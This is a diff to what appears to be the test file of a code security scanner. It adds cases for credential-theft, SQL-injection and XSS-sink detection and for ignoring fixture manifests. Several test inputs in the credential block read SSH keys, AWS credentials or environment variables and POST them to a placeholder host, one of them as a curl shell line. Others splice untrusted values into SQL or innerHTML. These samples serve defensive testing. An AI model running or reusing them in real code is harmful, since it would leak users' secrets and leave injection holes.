@@ -60,6 +60,13 @@ const paths = files => [...BASE, ...files].map(file => file.path);
   fires('environment shipped out', [...BASE, { path: 'lib/t.js', text: 'const body = JSON.stringify(process.env);\nfetch("https://example.test", { method: "POST", body });\n' }], ['SUP-005']);
   fires('credential store read', [...BASE, { path: 'lib/t.js', text: 'const k = fs.readFileSync(os.homedir() + "/.ssh/id_rsa");\n' }], ['SUP-005']);
   quiet('environment read without sending', [...BASE, { path: 'lib/t.js', text: 'const port = process.env.PORT;\n' }], ['SUP-005']);
+  /* A website scanner asks a site for the same paths a stealer reads from disk: a URL is not a local read. */
+  quiet('credential paths probed on a website', [...BASE, { path: 'lib/probe.js', text: "const PROBES = ['/.git/config', '/.aws/credentials', '/.docker/config.json'];\nconst r = await fetch(new URL(PROBES[0], site));\n" }], ['SUP-005']);
+  fires('home directory credentials sent out', [...BASE, { path: 'lib/t.js', text: "const k = fs.readFileSync(path.join(os.homedir(), '.aws/credentials'));\nfetch('https://example.test', { method: 'POST', body: k });\n" }], ['SUP-005']);
+  fires('home directory named elsewhere in the file', [...BASE, { path: 'lib/t.js', text: "const home = os.homedir();\nconst p = home + '/.ssh/id_ed25519';\n" }], ['SUP-005']);
+  fires('python reads a key from the home directory', [...BASE, { path: 'x.py', text: "key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\nrequests.post('https://example.test', data=key)\n" }], ['SUP-005']);
+  fires('a shell script copies the home credentials', [...BASE, { path: 'x.sh', text: 'cat ~/.aws/credentials | curl -X POST --data-binary @- https://example.test\n' }], ['SUP-005']);
+  quiet('a shell script probes a website path', [...BASE, { path: 'x.sh', text: 'curl -s https://example.test/.aws/credentials -o /dev/null\n' }], ['SUP-005']);
 
   fires('git dependency', [...BASE, { path: 'package.json', text: JSON.stringify({ dependencies: { thing: 'github:someone/thing' } }, null, 2) }], ['SUP-006']);
   quiet('workspace dependency', [...BASE, { path: 'package.json', text: JSON.stringify({ dependencies: { thing: 'workspace:*', other: 'file:../other' } }, null, 2) }], ['SUP-006', 'HYG-005']);
@@ -133,6 +140,26 @@ const paths = files => [...BASE, ...files].map(file => file.path);
   fires('SQL concat', [...BASE, { path: 'api/users.js', text: 'db.query("SELECT * FROM users WHERE id = " + id);\n' }], ['SEC-001']);
   fires('python f-string SQL', [...BASE, { path: 'app.py', text: 'cur.execute(f"SELECT * FROM users WHERE id = {uid}")\n' }], ['SEC-001']);
   quiet('parameterised SQL', [...BASE, { path: 'api/users.js', text: 'db.query("SELECT * FROM users WHERE id = $1", [id]);\nconst rows = await sql`SELECT * FROM users WHERE id = ${id}`;\n' }], ['SEC-001']);
+  /* The code's own SQL, kept in a constant, is not a value a caller sends. */
+  {
+    const tpl = (...parts) => parts.join('');
+    const scoped = "const SCOPE_SQL = 'owner=$1 AND repo=$2';\nconst COLUMNS = `id, name,\n  created_at`;\n\nasync function remove(client, base) {\n" +
+      tpl('  await client.query(`DELETE FROM t WHERE ', '$', '{SCOPE_SQL}`, base);\n') +
+      tpl('  return client.query(`SELECT ', '$', '{COLUMNS} FROM t WHERE ', '$', '{SCOPE_SQL}`, base);\n}\n');
+    quiet('a module constant spliced into SQL', [...BASE, { path: 'src/store.js', text: scoped }], ['SEC-001']);
+    quiet('a python module constant spliced into SQL', [...BASE, { path: 'store.py', text: 'SCOPE = "owner = %s"\n\ndef remove(cur, owner):\n    cur.execute(f"DELETE FROM t WHERE {SCOPE}", (owner,))\n' }], ['SEC-001']);
+    fires('a reassignable variable spliced into SQL', [...BASE, { path: 'src/store.js', text: "let where = 'owner=$1';\nwhere = req.query.filter;\n" + tpl('db.query(`DELETE FROM t WHERE ', '$', '{where}`);\n') }], ['SEC-001']);
+    fires('a constant shadowed by a parameter', [...BASE, { path: 'src/store.js', text: "const where = 'owner=$1';\nfunction remove(where) {\n" + tpl('  return db.query(`DELETE FROM t WHERE ', '$', '{where}`);\n}\n') }], ['SEC-001']);
+    fires('a constant built from a value', [...BASE, { path: 'src/store.js', text: "const where = 'owner=' + process.argv[2];\n" + tpl('db.query(`DELETE FROM t WHERE ', '$', '{where}`);\n') }], ['SEC-001']);
+    fires('a constant template that splices', [...BASE, { path: 'src/store.js', text: tpl("const where = `owner='", '$', "{process.argv[2]}'`;\n") + tpl('db.query(`DELETE FROM t WHERE ', '$', '{where}`);\n') }], ['SEC-001']);
+  }
+
+  /* A comment that describes a sink is not the sink, whether it has the line or follows code. */
+  quiet('a sink named in a block comment', [...BASE, { path: 'src/flow.js', text: '      /* dangerouslySetInnerHTML={{ __html: value }} */\nconst x = 1;\n' }], ['SEC-002']);
+  quiet('a sink named after code', [...BASE, { path: 'src/flow.js', text: 'const ok = true; // dangerouslySetInnerHTML={{ __html: value }}\n' }], ['SEC-002']);
+  fires('a sink before a comment', [...BASE, { path: 'web/x.jsx', text: 'const el = <div dangerouslySetInnerHTML={{ __html: value }} />; // render\n' }], ['SEC-002']);
+  quiet('a url in a string is not a comment', [...BASE, { path: 'src/x.js', text: 'const u = "https://example.test"; el.innerHTML = location.hash;\n' }], []);
+  fires('code after a url string still runs', [...BASE, { path: 'src/x.js', text: 'const u = "https://example.test"; el.innerHTML = location.hash;\n' }], ['SEC-002']);
 
   fires('untrusted innerHTML', [...BASE, { path: 'web/a.js', text: 'el.innerHTML = `<p>${comment.body}</p>`;\n' }], ['SEC-002']);
   fires('location into innerHTML', [...BASE, { path: 'web/a.js', text: 'out.innerHTML = location.hash;\n' }], ['SEC-002']);
@@ -329,6 +356,20 @@ const paths = files => [...BASE, ...files].map(file => file.path);
     'left-pad@1.3.0:pin:direct', 'lodash@4.17.15:lock:direct', 'minimist@1.2.5:lock:direct:dev'
   ], 'installed versions from the lockfile, exact pins when it has none, what came with them');
   assert(inventory.slice(0, 6).every(entry => entry.direct), 'declared packages are asked about first');
+
+  /* A fixture project a test reads is not an install of the application: neither its inventory nor its advisories. */
+  {
+    const fixture = { path: 'test/fixtures/next-app/package.json', text: JSON.stringify({ name: 'next-app', dependencies: { next: '14.2.0', lodash: '4.17.15' } }) };
+    const read = audit.readDependencies([manifest, lock, fixture]);
+    assert(!read.inventory.some(entry => entry.path === fixture.path), 'a fixture manifest adds nothing to the inventory');
+    assert(!read.inventory.some(entry => entry.name === 'next'), 'nor borrows the root lockfile for its packages');
+    assert.deepStrictEqual(read.setAside, [fixture.path]);
+    const fixtureAdvice = new Map([['npm:next@14.2.0', { advisories: [{ id: 'GHSA-f82v-jwr5-mffw', cve: 'CVE-2025-29927', severity: 'critical', summary: 'Authorization bypass in middleware', fixed: '14.2.25', malicious: false }] }]]);
+    const kept = run([...BASE, fixture, { path: 'testdata/py/requirements.txt', text: 'django==2.0.0\n' }], { advisories: fixtureAdvice });
+    assert(!kept.findings.some(item => item.category === 'dependencies'), 'no advisory, look-alike or registry finding comes from a fixture');
+    assert.strictEqual(kept.manifestsSetAside, 2);
+    assert.notStrictEqual(kept.grade, 'F');
+  }
 
   const advisories = new Map([
     ['npm:lodash@4.17.15', { advisories: [{ id: 'GHSA-35jh-r3h4-6jhm', cve: 'CVE-2021-23337', severity: 'serious', summary: 'Command injection in template', fixed: '4.17.21', malicious: false },
@@ -723,7 +764,7 @@ const paths = files => [...BASE, ...files].map(file => file.path);
   const express = advised.findings.find(item => item.detail && item.detail.package === 'express');
   assert.strictEqual(express.rule, 'DEP-005', 'the lowest version ^4.19.0 accepts is affected; 4.20.0 is inside the range');
   assert.strictEqual(express.detail.range, '^4.19.0');
-  assert.deepStrictEqual(advised.coverage.advisories, { versions: 2, checked: 2, unknown: 0, notChecked: 0, vulnerable: 1, malicious: 0, lockfiles: 1, lockfilesRead: 1 });
+  assert.deepStrictEqual(advised.coverage.advisories, { versions: 2, checked: 2, unknown: 0, notChecked: 0, vulnerable: 1, malicious: 0, lockfiles: 1, lockfilesRead: 1, setAside: 0 });
   assert.strictEqual(advised.coverage.exploit, null, 'without an exploit source, nothing is claimed about exploitation');
 
   /* With exploit intelligence: only the advisory's CVE leaves, after the advisories, as its own stage. */
